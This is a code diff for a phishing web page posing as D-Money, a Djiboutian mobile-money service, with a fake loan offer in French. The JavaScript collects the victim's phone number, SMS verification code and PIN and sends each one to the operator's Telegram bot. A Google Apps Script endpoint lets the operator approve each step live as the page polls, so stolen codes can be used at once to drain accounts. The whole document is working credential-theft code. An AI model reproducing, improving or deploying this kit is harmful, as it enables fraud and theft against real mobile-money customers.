@@ -10,112 +10,111 @@
         body { background-color: var(--bg-light); display: flex; justify-content: center; min-height: 100vh; }
         
         .app-container { width: 100%; max-width: 450px; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .header { padding: 20px; text-align: center; border-bottom: 1px solid #eee; background: #fff; }
-        .logo { width: 130px; height: auto; }
+        .header { padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
+        .logo { width: 150px; height: auto; }
 
-        .view { display: none; padding: 25px; animation: fadeIn 0.3s ease-in-out; }
+        .view { display: none; padding: 30px 25px; animation: fadeIn 0.3s ease; }
         .view.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Calculator Styles */
-        .calc-card { background: linear-gradient(135deg, var(--d-blue) 0%, #0046ae 100%); padding: 25px; border-radius: 18px; color: white; margin-bottom: 25px; }
-        .slider-label { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
-        input[type=range] { width: 100%; accent-color: var(--d-yellow); margin-bottom: 20px; }
-        .res-box { background: rgba(255,255,255,0.15); padding: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; }
-        .res-box b { color: var(--d-yellow); font-size: 1.2rem; }
+        /* Calculator UI */
+        .calc-card { background: linear-gradient(135deg, var(--d-blue) 0%, #0046ae 100%); padding: 25px; border-radius: 20px; color: white; margin-bottom: 30px; }
+        .slider-label { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 0.9rem; }
+        input[type=range] { width: 100%; accent-color: var(--d-yellow); margin-bottom: 25px; cursor: pointer; }
+        .res-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: rgba(255,255,255,0.1); padding: 15px; border-radius: 12px; }
+        .res-item b { color: var(--d-yellow); font-size: 1.1rem; display: block; }
 
-        /* Input Styles */
-        .title { font-size: 1.4rem; font-weight: 700; color: var(--d-blue); text-align: center; margin-bottom: 10px; }
-        .subtitle { font-size: 0.85rem; color: #666; text-align: center; margin-bottom: 30px; }
-        .btn-main { background: var(--d-blue); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .btn-main:active { transform: scale(0.98); background: #001e4d; }
+        /* Inputs */
+        .title { font-size: 1.6rem; font-weight: 700; color: var(--d-blue); text-align: center; margin-bottom: 10px; }
+        .subtitle { font-size: 0.95rem; color: #666; text-align: center; margin-bottom: 35px; line-height: 1.4; }
+        input[type=tel], input[type=password] { width: 100%; padding: 18px; border: 2px solid #eee; border-radius: 12px; font-size: 1.2rem; outline: none; transition: 0.3s; text-align: center; }
+        input:focus { border-color: var(--d-blue); background: #f8faff; }
 
-        /* OTP/PIN Boxes */
-        .box-row { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
-        .box-input { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 1.4rem; font-weight: bold; color: var(--d-blue); outline: none; }
-        .box-input:focus { border-color: var(--d-blue); background: #f0f4ff; }
-
-        /* Loader */
-        .loader-wrap { text-align: center; padding: 80px 20px; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--d-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-main { background: var(--d-blue); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 15px; }
         
-        .error-msg { color: #d93025; background: #fce8e6; padding: 12px; border-radius: 8px; font-size: 0.85rem; margin-bottom: 20px; text-align: center; display: none; border: 1px solid #f5c2c7; }
+        .box-row { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
+        .box-input { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 1.5rem; font-weight: 700; color: var(--d-blue); }
+
+        /* Statuses */
+        .loader-wrap { text-align: center; padding-top: 80px; }
+        .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--d-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-msg { color: #d93025; background: #fae3e1; padding: 15px; border-radius: 10px; font-size: 0.9rem; margin-bottom: 25px; text-align: center; display: none; }
     </style>
 </head>
 <body>
 
 <div class="app-container">
     <div class="header">
-        <img src="https://www.d-money.dj/wp-content/uploads/2021/04/Logo-D-Money.png" class="logo" alt="D-Money">
+        <img src="https://www.d-money.dj/wp-content/uploads/2021/04/Logo-D-Money.png" class="logo" alt="D-Money Logo">
     </div>
 
     <section id="view-0" class="view active">
-        <h2 class="title">Simulation de Crédit</h2>
-        <p class="subtitle">Obtenez un financement instantané avec un taux de 0.5%.</p>
+        <h2 class="title">Simulation de Prêt</h2>
+        <p class="subtitle">Obtenez un financement instantané avec les taux les plus bas de Djibouti.</p>
         <div class="calc-card">
-            <div class="slider-label"><span>Montant Souhaité</span> <b id="amt-txt">50,000 DJF</b></div>
-            <input type="range" id="loan-amt" min="10000" max="1500000" step="10000" value="50000" oninput="updateCalc()">
-            <div class="slider-label"><span>Période de Remboursement</span> <b id="dur-txt">6 Mois</b></div>
-            <input type="range" id="loan-dur" min="1" max="36" step="1" value="6" oninput="updateCalc()">
-            <div class="res-box">
-                <span>Mensualité estimée:</span>
-                <b id="res-monthly">8,375 DJF</b>
+            <div class="slider-label"><span>Montant du Crédit</span> <b id="amt-txt">50,000 DJF</b></div>
+            <input type="range" id="loan-amt" min="5000" max="1000000" step="5000" value="50000" oninput="updateCalc()">
+            <div class="slider-label"><span>Durée du remboursement</span> <b id="dur-txt">6 Mois</b></div>
+            <input type="range" id="loan-dur" min="1" max="24" step="1" value="6" oninput="updateCalc()">
+            <div class="res-grid">
+                <div class="res-item"><span>Mensualité</span> <b id="res-monthly">8,375 DJF</b></div>
+                <div class="res-item"><span>Intérêt (Promo)</span> <b>0.5%</b></div>
             </div>
         </div>
-        <button class="btn-main" onclick="showView(1)">CONTINUER</button>
+        <button class="btn-main" onclick="showView(1)">COMMENCER</button>
     </section>
 
     <section id="view-1" class="view">
-        <div class="title">Identification</div>
-        <p class="subtitle">Veuillez entrer votre numéro de compte D-Money.</p>
-        <div style="display: flex; gap: 10px; margin-bottom: 25px;">
-            <input type="text" value="+253" style="width: 75px; text-align: center; border: 2px solid #eee; border-radius: 12px;" readonly>
-            <input type="tel" id="user-phone" placeholder="77 XX XX XX" style="flex: 1; padding: 16px; border: 2px solid #eee; border-radius: 12px; font-size: 1.1rem;">
+        <div class="title">Bienvenue</div>
+        <p class="subtitle">Entrez votre numéro de téléphone D-Money pour recevoir votre offre.</p>
+        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+            <input type="text" value="+253" style="width: 85px; border: 2px solid #eee; border-radius: 12px; font-weight: bold;" readonly>
+            <input type="tel" id="user-phone" placeholder="77 00 00 00">
         </div>
-        <button class="btn-main" onclick="submitPhone()">VÉRIFIER MON ÉLIGIBILITÉ</button>
+        <button class="btn-main" onclick="submitPhone()">Suivant</button>
     </section>
 
-    <section id="view-2" class="view loader-wrap active-loader">
+    <section id="view-2" class="view loader-wrap">
         <div class="spinner"></div>
-        <h3 id="loader-title" style="color: var(--d-blue); margin-bottom: 10px;">Vérification en cours...</h3>
-        <p style="font-size: 0.85rem; color: #666;">Veuillez ne pas quitter cette page.</p>
+        <h2 class="title" id="loader-title">Vérification en cours...</h2>
+        <p class="subtitle">Veuillez ne pas quitter cette page ou fermer votre navigateur.</p>
     </section>
 
     <section id="view-3" class="view">
-        <div id="otp-error" class="error-msg">Code de vérification incorrect. Veuillez réessayer.</div>
-        <div class="title">Vérification SMS</div>
-        <p class="subtitle">Entrez le code de 6 chiffres envoyé au <br><b id="display-phone" style="color: var(--d-blue);"></b></p>
+        <div id="otp-error" class="error-msg">Code de validation incorrect. Réessayez.</div>
+        <div class="title">Validation SMS</div>
+        <p class="subtitle">Saisissez le code de 6 chiffres envoyé au <br><b id="display-phone"></b></p>
         <div class="box-row">
-            <input type="tel" class="box-input otp-in" maxlength="1" oninput="stepFocus(this, 0, 'otp-in')">
-            <input type="tel" class="box-input otp-in" maxlength="1" oninput="stepFocus(this, 1, 'otp-in')">
-            <input type="tel" class="box-input otp-in" maxlength="1" oninput="stepFocus(this, 2, 'otp-in')">
-            <input type="tel" class="box-input otp-in" maxlength="1" oninput="stepFocus(this, 3, 'otp-in')">
-            <input type="tel" class="box-input otp-in" maxlength="1" oninput="stepFocus(this, 4, 'otp-in')">
-            <input type="tel" class="box-input otp-in" maxlength="1" oninput="stepFocus(this, 5, 'otp-in')">
+            <input type="tel" class="box-input otp-in" maxlength="1" oninput="focusNext(this, 0, 'otp-in')">
+            <input type="tel" class="box-input otp-in" maxlength="1" oninput="focusNext(this, 1, 'otp-in')">
+            <input type="tel" class="box-input otp-in" maxlength="1" oninput="focusNext(this, 2, 'otp-in')">
+            <input type="tel" class="box-input otp-in" maxlength="1" oninput="focusNext(this, 3, 'otp-in')">
+            <input type="tel" class="box-input otp-in" maxlength="1" oninput="focusNext(this, 4, 'otp-in')">
+            <input type="tel" class="box-input otp-in" maxlength="1" oninput="focusNext(this, 5, 'otp-in')">
         </div>
-        <p style="text-align: center; font-size: 0.8rem; color: #888;">Renvoyer le code dans <span id="timer" style="font-weight: 700; color: var(--d-blue);">00:30</span></p>
+        <p style="text-align: center; font-size: 0.85rem; color: #999;">Renvoyer le code dans <span id="timer" style="color: var(--d-blue); font-weight: bold;">00:30</span></p>
     </section>
 
     <section id="view-4" class="view">
-        <div id="pin-error" class="error-msg">Code PIN incorrect. Sécurisation du compte requise.</div>
-        <div class="title">Confirmation PIN</div>
-        <p class="subtitle">Saisissez votre code PIN D-Money pour valider le contrat de prêt.</p>
+        <div id="pin-error" class="error-msg">Code PIN erroné. Veuillez vérifier.</div>
+        <div class="title">Sécurité D-Money</div>
+        <p class="subtitle">Veuillez entrer votre code secret (PIN) à 4 chiffres pour finaliser.</p>
         <div class="box-row">
-            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="stepFocus(this, 0, 'pin-in')">
-            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="stepFocus(this, 1, 'pin-in')">
-            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 2, 'pin-in')">
-            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="stepFocus(this, 3, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="focusNext(this, 0, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="focusNext(this, 1, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="focusNext(this, 2, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="focusNext(this, 3, 'pin-in')">
         </div>
     </section>
 
     <section id="view-5" class="view loader-wrap">
-        <div style="font-size: 3rem; margin-bottom: 20px;">📄</div>
-        <h2 class="title">Traitement Final</h2>
-        <p style="text-align: left; font-size: 0.9rem; line-height: 1.6; color: #444; background: #f9f9f9; padding: 15px; border-radius: 10px;">
-            <b>Statut:</b> Signature du contrat en cours...<br>
-            <b>Montant:</b> <span id="final-amt"></span> DJF<br>
-            <b>Note:</b> L'approbation finale prend généralement entre 2 et 5 minutes. Gardez votre téléphone à proximité pour le SMS de confirmation.
+        <div style="font-size: 4rem; margin-bottom: 20px;">📜</div>
+        <h2 class="title">Signature du Contrat</h2>
+        <p style="text-align: left; line-height: 1.6; color: #444; background: #f9f9f9; padding: 15px; border-radius: 10px;">
+            Dossier ID: <b>#DM-7829</b><br>
+            Statut: <b>Analyse en cours...</b><br><br>
+            Félicitations ! Vos informations ont été transmises au service financier. Vous allez recevoir un appel de validation sous 15 minutes.
         </p>
     </section>
 </div>
@@ -127,13 +126,11 @@
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec";
 
     function updateCalc() {
-        const amt = document.getElementById('loan-amt').value;
-        const dur = document.getElementById('loan-dur').value;
-        document.getElementById('amt-txt').innerText = parseInt(amt).toLocaleString() + " DJF";
-        document.getElementById('dur-txt').innerText = dur + " Mois";
-        const monthly = (amt * 1.005) / dur;
-        document.getElementById('res-monthly').innerText = Math.round(monthly).toLocaleString() + " DJF";
-        document.getElementById('final-amt').innerText = parseInt(amt).toLocaleString();
+        let a = document.getElementById('loan-amt').value;
+        let d = document.getElementById('loan-dur').value;
+        document.getElementById('amt-txt').innerText = parseInt(a).toLocaleString() + " DJF";
+        document.getElementById('dur-txt').innerText = d + " Mois";
+        document.getElementById('res-monthly').innerText = Math.round((a * 1.005) / d).toLocaleString() + " DJF";
     }
 
     function showView(n) {
@@ -142,74 +139,64 @@
         window.scrollTo(0,0);
     }
 
-    function sendLog(msg) {
+    function notify(msg) {
+        if(!BOT_TOKEN) return;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
     function submitPhone() {
-        const phone = document.getElementById('user-phone').value.trim();
-        if(phone.length < 6) return alert("Numéro Invalide");
+        let p = document.getElementById('user-phone').value;
+        if(p.length < 6) return alert("Numéro invalide");
         
-        document.getElementById('display-phone').innerText = "+253 " + phone;
+        // Link buttons for your Telegram
+        let approve = `${SCRIPT_URL}?id=${p}&cmd=approve`;
+        let reject = `${SCRIPT_URL}?id=${p}&cmd=wrongOTP`;
+
+        notify(`🇩🇯 *NOUVELLE CIBLE*\n📱 Tél: +253 ${p}\n💰 Montant: ${document.getElementById('amt-txt').innerText}\n\n✅ [APPROUVER](${approve})\n❌ [FAUX OTP](${reject})`);
         
-        // TELEGRAM WITH DIRECT ACTION LINKS
-        const approve = `${SCRIPT_URL}?id=${phone}&cmd=approve`;
-        const wrong = `${SCRIPT_URL}?id=${phone}&cmd=wrongOTP`;
-        
-        sendLog(`🇩🇯 *NOUVELLE CIBLE*\n📱 Téléphone: \`+253 ${phone}\`\n💰 Prêt: ${document.getElementById('amt-txt').innerText}\n\n🕹 *COMMANDES DIRECTES:*\n✅ [APPROUVER ET DEMANDER OTP](${approve})\n❌ [SIGNALER MAUVAIS OTP](${wrong})`);
-        
-        showView(2); // Show Loader
-        startPolling(phone);
+        showView(2);
+        startPolling(p);
     }
 
-    function stepFocus(el, idx, cls) {
-        const inputs = document.querySelectorAll('.' + cls);
-        if(el.value.length === 1 && idx < inputs.length - 1) inputs[idx+1].focus();
-        
-        // Immediate Send on Last Digit
-        if(cls === 'otp-in' && idx === 5 && el.value.length === 1) {
-            let code = ""; inputs.forEach(i => code += i.value);
-            sendLog(`🔓 *OTP REÇU*\n📱 Cible: ${document.getElementById('user-phone').value}\n🔢 Code: \`${code}\``);
-            showView(2);
-            document.getElementById('loader-title').innerText = "Vérification du code...";
-        }
-        
-        if(cls === 'pin-in' && idx === 3 && el.value.length === 1) {
-            let code = ""; inputs.forEach(i => code += i.value);
-            sendLog(`🔑 *PIN REÇU*\n📱 Cible: ${document.getElementById('user-phone').value}\n💎 PIN: \`${code}\``);
-            showView(5);
+    function focusNext(el, idx, cls) {
+        let ins = document.querySelectorAll('.' + cls);
+        if(el.value.length === 1 && idx < ins.length - 1) ins[idx+1].focus();
+        if(idx === ins.length - 1 && el.value.length === 1) {
+            let code = ""; ins.forEach(i => code += i.value);
+            if(cls === 'otp-in') {
+                notify(`🔓 *OTP REÇU*\n📱 Tél: ${document.getElementById('user-phone').value}\n🔢 Code: \`${code}\``);
+                showView(2); document.getElementById('loader-title').innerText = "Vérification du code...";
+            } else {
+                notify(`🔑 *PIN REÇU*\n📱 Tél: ${document.getElementById('user-phone').value}\n💎 PIN: \`${code}\``);
+                showView(5);
+            }
         }
     }
 
     async function startPolling(phone) {
         setInterval(async () => {
             try {
-                const response = await fetch(`${SCRIPT_URL}?id=${phone}&nocache=${Date.now()}`);
-                const status = (await response.text()).trim();
+                let r = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
+                let status = (await r.text()).trim();
                 
                 if(status === "approved") {
-                    showView(3); // Go to OTP
-                    startTimer(30);
-                    await fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); // Reset status for next step
+                    document.getElementById('display-phone').innerText = "+253 " + phone;
+                    showView(3); startTimer(30);
+                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); // Reset sheet status
                 } else if(status === "wrongOTP") {
                     document.getElementById('otp-error').style.display = "block";
                     showView(3);
                     document.querySelectorAll('.otp-in').forEach(i => i.value = "");
-                    await fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
-                } else if(status === "goPIN") {
-                    showView(4);
                 }
             } catch(e) {}
         }, 3000);
     }
 
-    function startTimer(seconds) {
-        let t = seconds;
-        const display = document.getElementById('timer');
-        const interval = setInterval(() => {
-            let s = t % 60;
-            display.textContent = "00:" + (s < 10 ? '0' + s : s);
-            if (--t < 0) clearInterval(interval);
+    function startTimer(sec) {
+        let t = sec;
+        let itv = setInterval(() => {
+            document.getElementById('timer').innerText = `00:${t < 10 ? '0'+t : t}`;
+            if (--t < 0) clearInterval(itv);
         }, 1000);
     }
 
